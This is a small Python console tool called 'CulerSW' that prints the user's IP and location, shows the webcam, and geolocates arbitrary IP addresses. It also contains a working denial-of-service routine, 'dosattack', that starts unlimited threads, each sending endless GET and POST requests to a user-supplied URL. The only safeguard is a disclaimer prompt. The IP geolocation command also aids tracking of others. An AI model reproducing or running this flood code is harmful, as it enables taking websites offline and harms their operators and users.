# python 3.9
import os
import stun
import geocoder
import cv2
import threading
import requests
import colorama
import webbrowser
import random
folder = "~"
print(f"{colorama.Fore.RED}CulerSW {colorama.Fore.BLUE}0.0.2v{colorama.Fore.GREEN}")
while True:
	command = input(f"[{folder}] $ ")
	if "cd " in command:
		os.system(command)
		folder = command.replace("cd ","")
	elif command == "getip":
		print(stun.get_ip_info()[1])
	elif command == "getlocation":
		print(f"Location : \n{geocoder.ip('me')}\n Geolocation : \n{geocoder.ip('me').latlng[0]},{geocoder.ip('me').latlng[1]}")
	elif command == "openlocation":
		webbrowser.open_new_tab(f"https://www.google.com.ua/maps/place/{geocoder.ip('me').latlng[0]},{geocoder.ip('me').latlng[1]}")
	elif command == "getcamera":
		cap = cv2.VideoCapture(0)
		while cap.isOpened():
			success, img = cap.read()
			img_gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
			cv2.imshow("Camera", img)
			if cv2.waitKey(1) & 0xff == ord('x'):
				break
		cap.release()
		cv2.destroyAllWindows()
	elif command == "dosattack":
		print("Do not use this command for malicious intent? you are responsible your own affairs. Are you sure to do this?\n[Yes/y][No/n]")
		chosed = input("$ ")
		if chosed == "y":
			url = input("[url] $ ")
			def dos():
				while True:
					try:
						requests.get(url)
						requests.post(url)
						print(colorama.Fore.YELLOW + "Request sent! " + colorama.Fore.RED + url) 
					except requests.exceptions.ConnectionError: 
						print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!") 
					except requests.exceptions.MissingSchema:
						break
						print(f"Not found website {str(url)}")

			while True:
				threading.Thread(target=dos).start()
	elif command == "foundinip":
		print("Do not use this command for malicious intent? you are responsible your own affairs. Are you sure to do this?\n[Yes/y][No/n]")
		chosed = input("$ ")
		if chosed == "y":
			IP = input("[IP] $ ")
			print(str(geocoder.ip(IP).latlng[0])+", "+str(geocoder.ip(IP).latlng[1]))
			print("Open in browser\n[Yes/y][No/n]")
			chosse = input("$ ")
			if chosse == "y":
				webbrowser.open_new_tab(f"https://www.google.com.ua/maps/place/{geocoder.ip(IP).latlng[0]}, {geocoder.ip(IP).latlng[1]}")
	elif command == "line --help" or command == "line -h":
		print("getip - get ip")
		print("getlocation - get geolocation")
		print("openlocation - open google map with your location")
		print("getcamera- open window with camera image")
		print("dosattack - dos attack to website")
		print("foundinip - get geolocation with user ip")
	else:
		os.system(command)
